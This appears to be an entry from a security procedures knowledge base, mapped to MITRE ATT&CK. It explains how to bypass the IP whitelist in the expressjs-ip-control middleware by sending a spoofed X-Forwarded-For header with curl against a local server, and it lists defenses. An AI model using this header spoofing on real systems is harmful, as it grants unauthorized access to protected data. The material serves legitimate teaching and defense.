---
tags:
  - exploit
  - bypass
  - header-spoofing
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
commands:
  - '[[commands/curl-bypass-with-header]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.575Z'
sub_techniques: []
id: 788d4954-e19b-434a-add9-7799220e0302
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Whitelist-with-Spoofed-Header

## Summary

This procedure exploits the vulnerability by spoofing the X-Forwarded-For header to a whitelisted IP, bypassing authorization and accessing protected content.

## Description

The expressjs-ip-control module naively trusts the client-controlled X-Forwarded-For header for IP determination, without requiring trusted proxy validation. By setting it to 127.0.0.1, attackers impersonate a local whitelisted client. This leads to info disclosure. Expected outcome: Successful 200 response with sensitive data.

## Requirements

1. Server running and whitelist verified
2. curl or similar HTTP client
3. Knowledge of whitelisted IPs

## Defense

Defensive measures and detection strategies:

- Configure Express to trust only specific proxies (app.set('trust proxy', 'loopback'))
- Strip or validate X-Forwarded-For headers at the edge (e.g., NGINX)
- Detect anomalous headers in WAF logs

## Objectives

1. Gain unauthorized access to protected endpoints
2. Disclose sensitive information like tokens
3. Demonstrate the impact of unvalidated headers

## Instructions

### Step 1: Send Spoofed Request

**Context**: Manipulates the header to trick the middleware into authorizing the request.

**Command** ([[commands/curl-bypass-with-header]]):
```bash
curl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1'
```

> Sends GET with spoofed header. Expected output: HTTP 200 with body "SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC".

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Defense Evasion]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-bypass-with-header]]

## Tools Used

- [[tools/curl]]

## Tags

- exploit
- bypass
- header-spoofing
